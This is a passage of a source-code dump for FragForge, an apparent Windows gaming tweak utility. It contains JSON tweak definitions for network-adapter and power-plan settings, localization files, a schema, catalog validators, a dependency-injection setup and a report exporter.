      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    },
    {
      "type": "adapter",
      "parameters": {
        "descriptionContains": "I225-V",
        "physicalOnly": true
      }
    }
  ],
  "actions": [
    {
      "kind": "NetAdapterProperty",
      "parameters": {
        "adapterName": "{AdapterDescription:I225-V}",
        "properties": [
          {
            "keyword": "*EEE",
            "value": [
              "0"
            ]
          }
        ]
      }
    }
  ],
  "tags": [
    "competitive",
    "opt-in",
    "network"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "None",
    "1%lows": "None",
    "inputLatency": "None",
    "network": "Posible reducción de latencia de salida de baja potencia; no aumenta FPS",
    "boot": "None",
    "thermals": "None"
  },
  "references": [
    "https://learn.microsoft.com/en-us/powershell/module/netadapter/set-netadapteradvancedproperty",
    "https://learn.microsoft.com/en-us/windows-hardware/drivers/network/energy-efficient-ethernet"
  ],
  "notes": {
    "es-MX": "Solo I225-V; no toca Wi-Fi ni otros adaptadores. Puede renegociar el enlace y causar una interrupción breve. Si la palabra clave no existe, el tweak es NotApplicable.",
    "en-US": "I225-V only; Wi-Fi and other adapters are untouched. It may renegotiate the link and cause a brief interruption. If the keyword is absent, the tweak is NotApplicable."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar durante una partida o si el enlace es inestable. No esperar menor ping a Internet; el efecto es local al enlace.",
    "en-US": "Do not apply during a match or if the link is unstable. Do not expect lower Internet ping; the effect is local to the link."
  }
}
````

### `src/FragForge.Tweaks/Catalog/Power/power.fragforge-performance.json`  <sub>(77 líneas)</sub>

````json
{
  "id": "power.fragforge-performance",
  "category": "Power",
  "title": {
    "es-MX": "Plan FragForge Performance",
    "en-US": "FragForge Performance plan"
  },
  "description": {
    "es-MX": "Duplica Alto rendimiento, fija procesador mínimo 100% y CPMINCORES 100% en AC/DC, y activa el plan nuevo.",
    "en-US": "Duplicates High performance, sets minimum processor 100% and CPMINCORES 100% on AC/DC, and activates the new plan."
  },
  "evidence": "Medium",
  "risk": "Moderate",
  "requiresReboot": false,
  "requiresAdmin": true,
  "conditions": [
    {
      "type": "windows",
      "parameters": {
        "minBuild": 26100,
        "maxBuild": 26299,
        "architecture": "X64"
      }
    }
  ],
  "actions": [
    {
      "kind": "PowerPlan",
      "parameters": {
        "planName": "FragForge Performance",
        "sourceSchemeGuid": "8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c",
        "activate": true,
        "settings": [
          {
            "subgroupGuid": "54533251-82be-4824-96c1-47b60b740d00",
            "settingGuid": "893dee8e-2bef-41e0-89c6-b55d0929964c",
            "acValue": 100,
            "dcValue": 100
          },
          {
            "subgroupGuid": "54533251-82be-4824-96c1-47b60b740d00",
            "settingGuid": "0cc5b647-c1df-4637-891a-dec35c318583",
            "acValue": 100,
            "dcValue": 100
          }
        ]
      }
    }
  ],
  "tags": [
    "competitive",
    "opt-in",
    "thermal-opt-in"
  ],
  "conflictsWith": [],
  "dependsOn": [],
  "expectedImpact": {
    "fps": "Variable",
    "1%lows": "Posible mejora de consistencia; puede empeorar por temperatura",
    "inputLatency": "None",
    "network": "None",
    "boot": "None",
    "thermals": "Peor: más consumo/reposo caliente"
  },
  "references": [
    "https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/powercfg-command-line-options",
    "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/powercfg"
  ],
  "notes": {
    "es-MX": "No borra planes existentes. Si el plan ya existe, captura sus ajustes antes de modificarlo. En el PN64, DTT/IPF y PL1/PL2 siguen mandando; 100% mínimo no elimina límites térmicos. Revert reactiva el plan anterior y elimina solo el plan creado.",
    "en-US": "Does not delete existing plans. If the plan already exists, its settings are captured before modification. On the PN64, DTT/IPF and PL1/PL2 still dominate; 100% minimum does not remove thermal limits. Revert reactivates the previous plan and deletes only the created plan."
  },
  "whenNotToApply": {
    "es-MX": "No aplicar si el mini PC se calienta demasiado, hace ruido o reduce clocks bajo carga sostenida. No es recomendable para batería.",
    "en-US": "Do not apply if the mini PC overheats, is noisy, or clocks down under sustained load. Not recommended on battery."
  }
}
````

### `src/FragForge.Tweaks/FragForge.Tweaks.csproj`  <sub>(11 líneas)</sub>

````xml
<Project Sdk="Microsoft.NET.Sdk">
  <ItemGroup>
    <ProjectReference Include="../FragForge.Core/FragForge.Core.csproj" />
    <EmbeddedResource Include="Catalog/**/*.json" />
    <EmbeddedResource Include="Localization/*.json" />
    <EmbeddedResource Include="Schema/*.json" />
    <None Include="Catalog/**/*.json" CopyToOutputDirectory="PreserveNewest" TargetPath="Catalog/%(RecursiveDir)%(Filename)%(Extension)" />
    <None Include="Localization/*.json" CopyToOutputDirectory="PreserveNewest" TargetPath="Localization/%(Filename)%(Extension)" />
    <None Include="Schema/*.json" CopyToOutputDirectory="PreserveNewest" TargetPath="Schema/%(Filename)%(Extension)" />
  </ItemGroup>
</Project>
````

### `src/FragForge.Tweaks/Localization/LocalizationLoader.cs`  <sub>(15 líneas)</sub>

````csharp
using FragForge.Core.Localization;

namespace FragForge.Tweaks.Localization;

public static class LocalizationLoader
{
    public static async Task<Localizer> LoadAsync(string culture, CancellationToken cancellationToken = default)
    {
        var normalized = culture.StartsWith("en", StringComparison.OrdinalIgnoreCase) ? "en-US" : "es-MX";
        var resource = $"FragForge.Tweaks.Localization.{normalized}.json";
        using var stream = typeof(LocalizationLoader).Assembly.GetManifestResourceStream(resource) ?? throw new InvalidDataException($"Localization resource '{resource}' is missing.");
        using var reader = new StreamReader(stream);
        return Localizer.FromJson(normalized, await reader.ReadToEndAsync(cancellationToken));
    }
}
````

### `src/FragForge.Tweaks/Localization/en-US.json`  <sub>(37 líneas)</sub>

````json
{
  "app.title": "FragForge — Layer 0",
  "nav.scan": "Scan",
  "nav.apply": "Apply selected",
  "nav.revert": "Revert",
  "nav.dryRun": "Dry-run",
  "nav.snapshot": "Create snapshot",
  "nav.export": "Export report",
  "hardware.title": "Detected hardware",
  "tweaks.title": "Tweaks",
  "logs.title": "Log",
  "profile.label": "Profile",
  "culture.label": "Language",
  "state.NotApplied": "Not applied",
  "state.Applied": "Applied",
  "state.PartiallyApplied": "Partial",
  "state.NotApplicable": "Not applicable",
  "state.Unknown": "Unknown",
  "state.AppliedExternally": "Applied externally",
  "state.Inspected": "Read-only",
  "risk.title": "Risk confirmation",
  "risk.first": "This tweak may reduce stability or security. Continue?",
  "risk.second": "Confirm again. Type ACEPTO EL RIESGO to enable application.",
  "risk.phrase": "ACEPTO EL RIESGO",
  "busy": "Operation in progress…",
  "ready": "Ready",
  "error": "Error",
  "cancel": "Cancel",
  "selected": "Selected",
  "cs2Path": "Manual cs2.exe path",
  "restorePoint": "Create restore point",
  "enableProtection": "Enable System Protection if turned off",
  "force": "Force overwrite of external state",
  "allowPowerShell": "Allow experimental PowerShell actions",
  "doctor.title": "Preflight",
  "journal.integrity": "Journal integrity"
}
````

### `src/FragForge.Tweaks/Localization/es-MX.json`  <sub>(37 líneas)</sub>

````json
{
  "app.title": "FragForge — Capa 0",
  "nav.scan": "Escanear",
  "nav.apply": "Aplicar seleccionados",
  "nav.revert": "Revertir",
  "nav.dryRun": "Dry-run",
  "nav.snapshot": "Crear snapshot",
  "nav.export": "Exportar informe",
  "hardware.title": "Hardware detectado",
  "tweaks.title": "Tweaks",
  "logs.title": "Registro",
  "profile.label": "Perfil",
  "culture.label": "Idioma",
  "state.NotApplied": "No aplicado",
  "state.Applied": "Aplicado",
  "state.PartiallyApplied": "Parcial",
  "state.NotApplicable": "No aplicable",
  "state.Unknown": "Desconocido",
  "state.AppliedExternally": "Aplicado externamente",
  "state.Inspected": "Informativo",
  "risk.title": "Confirmación de riesgo",
  "risk.first": "Este tweak puede reducir estabilidad o seguridad. ¿Deseas continuar?",
  "risk.second": "Confirma de nuevo. Escribe ACEPTO EL RIESGO para habilitar la aplicación.",
  "risk.phrase": "ACEPTO EL RIESGO",
  "busy": "Operación en curso…",
  "ready": "Listo",
  "error": "Error",
  "cancel": "Cancelar",
  "selected": "Seleccionados",
  "cs2Path": "Ruta manual de cs2.exe",
  "restorePoint": "Crear punto de restauración",
  "enableProtection": "Habilitar protección del sistema si está apagada",
  "force": "Forzar sobrescritura de estado externo",
  "allowPowerShell": "Permitir acciones PowerShell experimentales",
  "doctor.title": "Preflight",
  "journal.integrity": "Integridad del journal"
}
````

### `src/FragForge.Tweaks/Schema/tweak.schema.json`  <sub>(47 líneas)</sub>

````json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "$id": "https://fragforge.local/schemas/tweak-0.1.json",
  "title": "FragForge Tweak Definition v1",
  "type": "object",
  "additionalProperties": false,
  "required": ["id", "category", "title", "description", "evidence", "risk", "expectedImpact", "actions", "references"],
  "properties": {
    "id": { "type": "string", "minLength": 3, "pattern": "^[a-z0-9][a-z0-9.-]{2,80}$" },
    "category": { "type": "string", "enum": ["Cpu", "Power", "Network", "Gpu", "Latency", "Cs2", "Debloat", "Memory", "Diagnostics"] },
    "title": { "$ref": "#/$defs/localizedText" },
    "description": { "$ref": "#/$defs/localizedText" },
    "evidence": { "type": "string", "enum": ["High", "Medium", "Low", "Experimental"] },
    "risk": { "type": "string", "enum": ["Safe", "Moderate", "Advanced", "Experimental"] },
    "requiresReboot": { "type": "boolean" },
    "requiresAdmin": { "type": "boolean" },
    "conditions": { "type": "array", "items": { "$ref": "#/$defs/condition" } },
    "actions": { "type": "array", "minItems": 1, "items": { "$ref": "#/$defs/action" } },
    "tags": { "type": "array", "items": { "type": "string", "minLength": 1 } },
    "conflictsWith": { "type": "array", "items": { "type": "string", "minLength": 1 } },
    "dependsOn": { "type": "array", "items": { "type": "string", "minLength": 1 } },
    "expectedImpact": {
      "type": "object", "additionalProperties": false,
      "properties": {
        "fps": { "type": "string" }, "1%lows": { "type": "string" }, "inputLatency": { "type": "string" },
        "network": { "type": "string" }, "boot": { "type": "string" }, "thermals": { "type": "string" }
      }
    },
    "references": { "type": "array", "minItems": 1, "items": { "type": "string", "minLength": 1 } },
    "notes": { "$ref": "#/$defs/localizedText" },
    "whenNotToApply": { "$ref": "#/$defs/localizedText" }
  },
  "$defs": {
    "localizedText": {
      "type": "object", "additionalProperties": false, "required": ["es-MX", "en-US"],
      "properties": { "es-MX": { "type": "string", "minLength": 1 }, "en-US": { "type": "string", "minLength": 1 } }
    },
    "condition": {
      "type": "object", "additionalProperties": false, "required": ["type"],
      "properties": { "type": { "type": "string", "minLength": 1 }, "parameters": { "type": "object" } }
    },
    "action": {
      "type": "object", "additionalProperties": false, "required": ["kind"],
      "properties": { "kind": { "type": "string", "minLength": 1 }, "parameters": { "type": "object" } }
    }
  }
}
````

### `src/FragForge.Tweaks/TweakCatalog.cs`  <sub>(68 líneas)</sub>

````csharp
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;
using FragForge.Tweaks.Validation;

namespace FragForge.Tweaks;

public sealed class TweakCatalog : ITweakCatalog
{
    private readonly IReadOnlyDictionary<string, TweakDefinition> _definitions;
    private readonly IReadOnlyDictionary<string, string> _hashes;
    public IReadOnlyList<TweakDefinition> Definitions { get; }
    public TweakCatalog(IReadOnlyList<TweakDefinition> definitions)
    {
        Definitions = definitions.OrderBy(d => d.Id, StringComparer.OrdinalIgnoreCase).ToArray();
        _definitions = Definitions.ToDictionary(d => d.Id, StringComparer.OrdinalIgnoreCase);
        _hashes = Definitions.ToDictionary(d => d.Id, d => Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(JsonSerializer.Serialize(d, JsonDefaults.Create(false))))).ToLowerInvariant(), StringComparer.OrdinalIgnoreCase);
    }
    public TweakDefinition Get(string id) => _definitions.TryGetValue(id, out var definition) ? definition : throw new KeyNotFoundException($"Tweak desconocido: {id}");
    public bool TryGet(string id, out TweakDefinition? definition) => _definitions.TryGetValue(id, out definition);
    public string GetDefinitionHash(string id) => _hashes[id];
}
public sealed class JsonTweakCatalogLoader(TweakCatalogValidator validator)
{
    public static string ReadEmbeddedSchema()
    {
        using var stream = typeof(JsonTweakCatalogLoader).Assembly.GetManifestResourceStream("FragForge.Tweaks.Schema.tweak.schema.json") ?? throw new InvalidDataException("Embedded tweak schema is missing.");
        using var reader = new StreamReader(stream);
        return reader.ReadToEnd();
    }
    public async Task<TweakCatalog> LoadEmbeddedAsync(string? additionalDirectory = null, CancellationToken cancellationToken = default)
    {
        var assembly = typeof(JsonTweakCatalogLoader).Assembly;
        var documents = new List<(string Name, string Json)>();
        foreach (var resource in assembly.GetManifestResourceNames().Where(n => n.StartsWith("FragForge.Tweaks.Catalog.", StringComparison.Ordinal) && n.EndsWith(".json", StringComparison.Ordinal)).OrderBy(n => n, StringComparer.Ordinal))
        {
            using var stream = assembly.GetManifestResourceStream(resource)!;
            using var reader = new StreamReader(stream);
            documents.Add((resource, await reader.ReadToEndAsync(cancellationToken)));
        }
        if (additionalDirectory is not null && Directory.Exists(additionalDirectory))
            foreach (var file in Directory.GetFiles(additionalDirectory, "*.json", SearchOption.AllDirectories).OrderBy(f => f, StringComparer.Ordinal)) documents.Add((file, await File.ReadAllTextAsync(file, cancellationToken)));
        return LoadDocuments(documents);
    }
    public TweakCatalog LoadDocuments(IReadOnlyList<(string Name, string Json)> documents)
    {
        var definitions = new List<TweakDefinition>();
        var errors = new List<string>();
        foreach (var (name, json) in documents)
        {
            try
            {
                using var document = JsonDocument.Parse(json);
                var structural = validator.ValidateStructure(document.RootElement);
                if (structural.Count > 0) { errors.AddRange(structural.Select(e => $"{name}: {e}")); continue; }
                var definition = JsonSerializer.Deserialize<TweakDefinition>(json, JsonDefaults.Options) ?? throw new JsonException("Documento nulo.");
                definitions.Add(definition);
            }
            catch (Exception ex) when (ex is JsonException or InvalidDataException or CatalogValidationException) { errors.Add($"{name}: {ex.Message}"); }
        }
        errors.AddRange(validator.ValidateCatalog(definitions));
        if (errors.Count > 0) throw new CatalogValidationException("El catálogo no pasó la validación de esquema/semántica.", errors);
        return new TweakCatalog(definitions);
    }
}
````

### `src/FragForge.Tweaks/Validation/JsonSchemaValidator.cs`  <sub>(76 líneas)</sub>

````csharp
using System.Text.Json;
using System.Text.RegularExpressions;

namespace FragForge.Tweaks.Validation;

public sealed class JsonSchemaValidator
{
    private readonly JsonElement _schema;
    public JsonSchemaValidator(string schemaJson) => _schema = JsonDocument.Parse(schemaJson).RootElement.Clone();
    public IReadOnlyList<string> Validate(JsonElement instance)
    {
        var errors = new List<string>();
        Validate(instance, _schema, "$", errors, 0);
        return errors;
    }
    private void Validate(JsonElement instance, JsonElement schema, string path, List<string> errors, int depth)
    {
        if (depth > 64) { errors.Add($"{path}: profundidad máxima excedida"); return; }
        if (schema.TryGetProperty("$ref", out var reference))
        {
            var pointer = reference.GetString()!;
            if (!pointer.StartsWith("#/", StringComparison.Ordinal)) { errors.Add($"{path}: solo se admiten referencias locales"); return; }
            var resolved = _schema;
            foreach (var segment in pointer[2..].Split('/')) resolved = resolved.GetProperty(segment.Replace("~1", "/").Replace("~0", "~"));
            Validate(instance, resolved, path, errors, depth + 1);
            return;
        }
        if (schema.TryGetProperty("type", out var type))
        {
            var expected = type.GetString();
            var valid = expected switch
            {
                "object" => instance.ValueKind == JsonValueKind.Object,
                "array" => instance.ValueKind == JsonValueKind.Array,
                "string" => instance.ValueKind == JsonValueKind.String,
                "boolean" => instance.ValueKind is JsonValueKind.True or JsonValueKind.False,
                "integer" => instance.ValueKind == JsonValueKind.Number && instance.TryGetInt64(out _),
                "number" => instance.ValueKind == JsonValueKind.Number,
                _ => true
            };
            if (!valid) { errors.Add($"{path}: se esperaba {expected}, se obtuvo {instance.ValueKind}"); return; }
        }
        if (schema.TryGetProperty("enum", out var enumeration) && !enumeration.EnumerateArray().Any(e => JsonElement.DeepEquals(e, instance))) errors.Add($"{path}: valor fuera de enum");
        if (instance.ValueKind == JsonValueKind.Object)
        {
            if (schema.TryGetProperty("required", out var required)) foreach (var property in required.EnumerateArray()) if (!instance.TryGetProperty(property.GetString()!, out _)) errors.Add($"{path}: falta '{property.GetString()}'");
            var properties = schema.TryGetProperty("properties", out var p) ? p : default;
            var additional = !schema.TryGetProperty("additionalProperties", out var a) || a.ValueKind != JsonValueKind.False;
            foreach (var property in instance.EnumerateObject())
            {
                if (properties.ValueKind == JsonValueKind.Object && properties.TryGetProperty(property.Name, out var child)) Validate(property.Value, child, path + "." + property.Name, errors, depth + 1);
                else if (!additional) errors.Add($"{path}: propiedad no permitida '{property.Name}'");
            }
        }
        if (instance.ValueKind == JsonValueKind.Array)
        {
            if (schema.TryGetProperty("minItems", out var min) && instance.GetArrayLength() < min.GetInt32()) errors.Add($"{path}: menos de {min.GetInt32()} elementos");
            if (schema.TryGetProperty("items", out var items))
            {
                var index = 0;
                foreach (var item in instance.EnumerateArray()) Validate(item, items, $"{path}[{index++}]", errors, depth + 1);
            }
        }
        if (instance.ValueKind == JsonValueKind.String)
        {
            var value = instance.GetString()!;
            if (schema.TryGetProperty("minLength", out var min) && value.Length < min.GetInt32()) errors.Add($"{path}: longitud mínima {min.GetInt32()}");
            if (schema.TryGetProperty("pattern", out var pattern) && !Regex.IsMatch(value, pattern.GetString()!, RegexOptions.CultureInvariant, TimeSpan.FromSeconds(1))) errors.Add($"{path}: no cumple el patrón");
        }
        if (instance.ValueKind == JsonValueKind.Number)
        {
            if (schema.TryGetProperty("minimum", out var min) && instance.GetDouble() < min.GetDouble()) errors.Add($"{path}: menor que mínimo");
            if (schema.TryGetProperty("maximum", out var max) && instance.GetDouble() > max.GetDouble()) errors.Add($"{path}: mayor que máximo");
        }
    }
}
````

### `src/FragForge.Tweaks/Validation/TweakCatalogValidator.cs`  <sub>(52 líneas)</sub>

````csharp
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Engine;
using FragForge.Core.Models;

namespace FragForge.Tweaks.Validation;

public sealed class TweakCatalogValidator(JsonSchemaValidator schema, ITweakConditionFactory conditions, ITweakActionFactory actions)
{
    public IReadOnlyList<string> ValidateStructure(JsonElement document) => schema.Validate(document);
    public IReadOnlyList<string> ValidateCatalog(IReadOnlyList<TweakDefinition> definitions)
    {
        var errors = new List<string>();
        var ids = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var definition in definitions)
        {
            if (!ids.Add(definition.Id)) errors.Add($"ID duplicado: {definition.Id}");
            if (definition.Title.EsMx.Length == 0 || definition.Title.EnUs.Length == 0 || definition.Description.EsMx.Length == 0 || definition.Description.EnUs.Length == 0) errors.Add($"{definition.Id}: textos localizados vacíos");
            if (definition.Actions.Count == 0) errors.Add($"{definition.Id}: sin acciones");
            if (!definition.ReadOnly && !definition.RequiresAdmin) errors.Add($"{definition.Id}: una acción mutante requiere Admin");
            if (definition.References.Count == 0) errors.Add($"{definition.Id}: sin referencias");
            if (definition.DependsOn.Contains(definition.Id, StringComparer.OrdinalIgnoreCase) || definition.ConflictsWith.Contains(definition.Id, StringComparer.OrdinalIgnoreCase)) errors.Add($"{definition.Id}: dependencia/conflicto consigo mismo");
            foreach (var condition in definition.Conditions) { try { conditions.Create(condition); } catch (Exception ex) { errors.Add($"{definition.Id}: condición inválida: {ex.Message}"); } }
            foreach (var action in definition.Actions)
            {
                try { actions.Create(action); } catch (Exception ex) { errors.Add($"{definition.Id}: acción inválida: {ex.Message}"); }
                if (action.Kind.Equals("PowerShell", StringComparison.OrdinalIgnoreCase) || action.Kind.Equals("Bcdedit", StringComparison.OrdinalIgnoreCase))
                    if (definition.Risk is not (RiskLevel.Advanced or RiskLevel.Experimental)) errors.Add($"{definition.Id}: {action.Kind} requiere riesgo Advanced/Experimental");
            }
        }
        foreach (var definition in definitions)
        {
            foreach (var dependency in definition.DependsOn) if (!ids.Contains(dependency)) errors.Add($"{definition.Id}: dependencia inexistente {dependency}");
            foreach (var conflict in definition.ConflictsWith) if (!ids.Contains(conflict)) errors.Add($"{definition.Id}: conflicto inexistente {conflict}");
        }
        var catalog = new InMemoryCatalog(definitions);
        foreach (var definition in definitions)
        {
            try { DependencyResolver.Resolve([definition.Id], catalog); }
            catch (FragForgeException ex) { errors.Add($"{definition.Id}: {ex.Message}"); }
        }
        return errors;
    }
    private sealed class InMemoryCatalog(IReadOnlyList<TweakDefinition> definitions) : ITweakCatalog
    {
        private readonly IReadOnlyDictionary<string, TweakDefinition> _map = definitions.ToDictionary(d => d.Id, StringComparer.OrdinalIgnoreCase);
        public IReadOnlyList<TweakDefinition> Definitions => definitions;
        public TweakDefinition Get(string id) => _map[id];
        public bool TryGet(string id, out TweakDefinition? definition) => _map.TryGetValue(id, out definition);
        public string GetDefinitionHash(string id) => "";
    }
}
````

---

## 3d. FragForge.Composition — raíz de composición y reportes

### `src/FragForge.Composition/ApplicationContext.cs`  <sub>(10 líneas)</sub>

````csharp
using FragForge.Core.Abstractions;

namespace FragForge.Composition;

public sealed class ApplicationContext(string dataRoot, string culture) : IApplicationContext
{
    public string Culture { get; set; } = culture;
    public string DataRoot { get; } = dataRoot;
    public string ApplicationVersion { get; } = typeof(ApplicationContext).Assembly.GetName().Version?.ToString(3) ?? "0.1.0";
}
````

### `src/FragForge.Composition/CompositionRoot.cs`  <sub>(98 líneas)</sub>

````csharp
using FragForge.Actions.DependencyInjection;
using FragForge.Actions.Files;
using FragForge.Actions.Network;
using FragForge.Actions.Platform;
using FragForge.Actions.Services;
using FragForge.Actions.Tasks;
using FragForge.Core.Abstractions;
using FragForge.Core.Conditions;
using FragForge.Core.Engine;
using FragForge.Core.Localization;
using FragForge.Core.Logging;
using FragForge.Core.Persistence;
using FragForge.Core.Preflight;
using FragForge.Tweaks;
using FragForge.Tweaks.Localization;
using FragForge.Tweaks.Validation;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Serilog;
using Serilog.Formatting.Compact;

namespace FragForge.Composition;

public sealed record ShellOptions(string? DataRoot = null, string Culture = "es-MX", bool ConsoleLogging = true, Action<IServiceCollection>? ConfigureServices = null);

public static class CompositionRoot
{
    public static async Task<IHost> BuildAsync(ShellOptions options, CancellationToken cancellationToken = default)
    {
        var paths = new FragForgePaths(options.DataRoot);
        paths.EnsureCreated();
        var policy = await ProtectionPolicy.LoadAsync(paths.AdditionalPolicy, cancellationToken);
        var localizer = await LocalizationLoader.LoadAsync(options.Culture, cancellationToken);
        var builder = Host.CreateApplicationBuilder();
        builder.Logging.ClearProviders();
        builder.Logging.SetMinimumLevel(LogLevel.Information);
        builder.Logging.AddFilter("Microsoft", LogLevel.Warning);
        builder.Logging.AddFilter("System.Net", LogLevel.Warning);
        var serilogConfig = new LoggerConfiguration()
            .MinimumLevel.Information()
            .MinimumLevel.Override("Microsoft", Serilog.Events.LogEventLevel.Warning)
            .Enrich.FromLogContext()
            .WriteTo.File(new CompactJsonFormatter(), Path.Combine(paths.Logs, "fragforge-.log"), rollingInterval: RollingInterval.Day, retainedFileCountLimit: 14, fileSizeLimitBytes: 10 * 1024 * 1024, rollOnFileSizeLimit: true, shared: true);
        if (options.ConsoleLogging) serilogConfig.WriteTo.Console(outputTemplate: "[{Timestamp:HH:mm:ss} {Level:u3}] {Message:lj}{NewLine}{Exception}");
        var serilog = serilogConfig.CreateLogger();
        builder.Services.AddSerilog(serilog, dispose: true);
        builder.Services.AddSingleton<IUiLogSink, UiLogSink>();
        builder.Services.AddSingleton<ILoggerProvider, UiLoggerProvider>();
        builder.Services.AddSingleton(paths);
        builder.Services.AddSingleton<IApplicationContext>(new ApplicationContext(paths.Root, localizer.Culture));
        builder.Services.AddSingleton(localizer);
        builder.Services.AddSingleton<IProtectionPolicy>(policy);
        builder.Services.AddSingleton<IProcessRunner, ProcessRunner>();
        if (OperatingSystem.IsWindows())
        {
            builder.Services.AddSingleton<IWmiQuery, WmiQuery>();
            builder.Services.AddSingleton<ICpuTopologyProbe, WindowsCpuTopologyProbe>();
            builder.Services.AddSingleton<IServiceController, WindowsServiceController>();
            builder.Services.AddSingleton<IScheduledTaskStore, WindowsScheduledTaskStore>();
            builder.Services.AddSingleton<INetworkAdapterController, WindowsNetworkAdapterController>();
            builder.Services.AddSingleton<ISystemRestoreService, SystemRestoreService>();
            builder.Services.AddSingleton<IGameLocator, SteamGameLocator>();
            builder.Services.AddSingleton<IHardwareProfiler, WindowsHardwareProfiler>();
        }
        else
        {
            builder.Services.AddSingleton<IWmiQuery, UnsupportedWmiQuery>();
            builder.Services.AddSingleton<ICpuTopologyProbe, UnsupportedCpuTopologyProbe>();
            builder.Services.AddSingleton<IServiceController, UnsupportedServiceController>();
            builder.Services.AddSingleton<IScheduledTaskStore, UnsupportedScheduledTaskStore>();
            builder.Services.AddSingleton<INetworkAdapterController, UnsupportedNetworkAdapterController>();
            builder.Services.AddSingleton<ISystemRestoreService, UnsupportedSystemRestoreService>();
            builder.Services.AddSingleton<IGameLocator, UnsupportedGameLocator>();
            builder.Services.AddSingleton<IHardwareProfiler, UnsupportedHardwareProfiler>();
        }
        builder.Services.AddFragForgeActions();
        builder.Services.AddSingleton<IProtectionPolicy>(policy);
        builder.Services.AddSingleton<ITweakConditionFactory, ConditionFactory>();
        builder.Services.AddSingleton<JsonSchemaValidator>(_ => new JsonSchemaValidator(JsonTweakCatalogLoader.ReadEmbeddedSchema()));
        builder.Services.AddSingleton<TweakCatalogValidator>();
        builder.Services.AddSingleton<JsonTweakCatalogLoader>();
        builder.Services.AddSingleton<ITweakCatalog>(sp => sp.GetRequiredService<JsonTweakCatalogLoader>().LoadEmbeddedAsync(Path.Combine(paths.Root, "catalog")).GetAwaiter().GetResult());
        builder.Services.AddSingleton<ISnapshotStore, FileSnapshotStore>();
        builder.Services.AddSingleton<IJournal, FileJournal>();
        builder.Services.AddSingleton<IExecutionGate, FileExecutionGate>();
        builder.Services.AddSingleton<IPreflightService, PreflightService>();
        builder.Services.AddSingleton<IEnumerable<IExperimentHook>>([]);
        builder.Services.AddSingleton<ITweakEngine, TweakEngine>();
        builder.Services.AddSingleton<IReportService, ReportService>();
        options.ConfigureServices?.Invoke(builder.Services);
        return builder.Build();
    }
}
public sealed class UnsupportedCpuTopologyProbe : ICpuTopologyProbe
{
    public Task<CpuTopologyResult> ReadAsync(CancellationToken cancellationToken = default) => Task.FromResult(new CpuTopologyResult(null, null, Environment.ProcessorCount, null, "Unsupported platform"));
}
````

### `src/FragForge.Composition/FragForge.Composition.csproj`  <sub>(14 líneas)</sub>

````xml
<Project Sdk="Microsoft.NET.Sdk">
  <ItemGroup>
    <ProjectReference Include="../FragForge.Core/FragForge.Core.csproj" />
    <ProjectReference Include="../FragForge.Actions/FragForge.Actions.csproj" />
    <ProjectReference Include="../FragForge.Tweaks/FragForge.Tweaks.csproj" />
    <PackageReference Include="Microsoft.Extensions.DependencyInjection" />
    <PackageReference Include="Microsoft.Extensions.Hosting" />
    <PackageReference Include="Serilog" />
    <PackageReference Include="Serilog.Extensions.Hosting" />
    <PackageReference Include="Serilog.Sinks.Console" />
    <PackageReference Include="Serilog.Sinks.File" />
    <PackageReference Include="Serilog.Formatting.Compact" />
  </ItemGroup>
</Project>
````

### `src/FragForge.Composition/ReportService.cs`  <sub>(64 líneas)</sub>

````csharp
using System.Net;
using System.Text;
using System.Text.Json;
using FragForge.Core.Abstractions;
using FragForge.Core.Logging;
using FragForge.Core.Models;
using FragForge.Core.Persistence;

namespace FragForge.Composition;

public sealed class ReportService(ITweakEngine engine, IPreflightService preflight, ISnapshotStore snapshots, IJournal journal, IApplicationContext context) : IReportService
{
    public async Task<ReportDocument> CreateAsync(CancellationToken cancellationToken = default)
    {
        var scan = await engine.ScanAsync(cancellationToken);
        var preflightReport = await preflight.CheckAsync(new ApplyOptions { CreateRestorePoint = true, Profile = TweakProfile.Safe }, scan.Hardware, cancellationToken);
        var entries = await journal.ReadAllAsync(cancellationToken);
        var integrity = await journal.VerifyIntegrityAsync(cancellationToken);
        var reverted = entries.Where(e => e.EventType == JournalEventType.SnapshotReverted && e.SnapshotId is not null).Select(e => e.SnapshotId!).ToHashSet(StringComparer.OrdinalIgnoreCase);
        var snapshotItems = (await snapshots.ListAsync(cancellationToken)).Select(s => new SnapshotListItem(s.Id, s.Label, s.CreatedAt, s.Tweaks.Count, s.RestorePointSequence, reverted.Contains(s.Id))).ToArray();
        return new ReportDocument(1, DateTimeOffset.UtcNow, context.ApplicationVersion, scan.Hardware, scan.Tweaks, preflightReport, snapshotItems, integrity, entries.TakeLast(100).ToArray());
    }
    public async Task ExportAsync(string path, string format, CancellationToken cancellationToken = default)
    {
        var report = await CreateAsync(cancellationToken);
        var full = Path.GetFullPath(path);
        Directory.CreateDirectory(Path.GetDirectoryName(full)!);
        var normalized = format.ToLowerInvariant();
        if (normalized is not ("json" or "html")) throw new ArgumentException("Formato debe ser json o html.");
        if (normalized == "json") await AtomicFile.WriteAllTextAsync(full, JsonSerializer.Serialize(report, JsonDefaults.Options), cancellationToken);
        else await AtomicFile.WriteAllTextAsync(full, RenderHtml(report), cancellationToken);
    }
    private static string RenderHtml(ReportDocument report)
    {
        var h = report.Hardware;
        var builder = new StringBuilder("<!doctype html><html lang=\"es\"><meta charset=\"utf-8\"><title>FragForge report</title><style>body{font-family:Segoe UI,Arial,sans-serif;background:#101418;color:#e8edf2;margin:2rem}table{border-collapse:collapse;width:100%;margin:1rem 0}td,th{border:1px solid #39424e;padding:.45rem;text-align:left}th{background:#1c2530}code{color:#8fd3ff}.warn{color:#ffd479}.bad{color:#ff8a80}</style><h1>FragForge — informe Capa 0</h1>");
        builder.Append("<p>Generado: ").Append(E(report.CreatedAt.ToString("O"))).Append(" · Versión ").Append(E(report.ApplicationVersion)).Append("</p>");
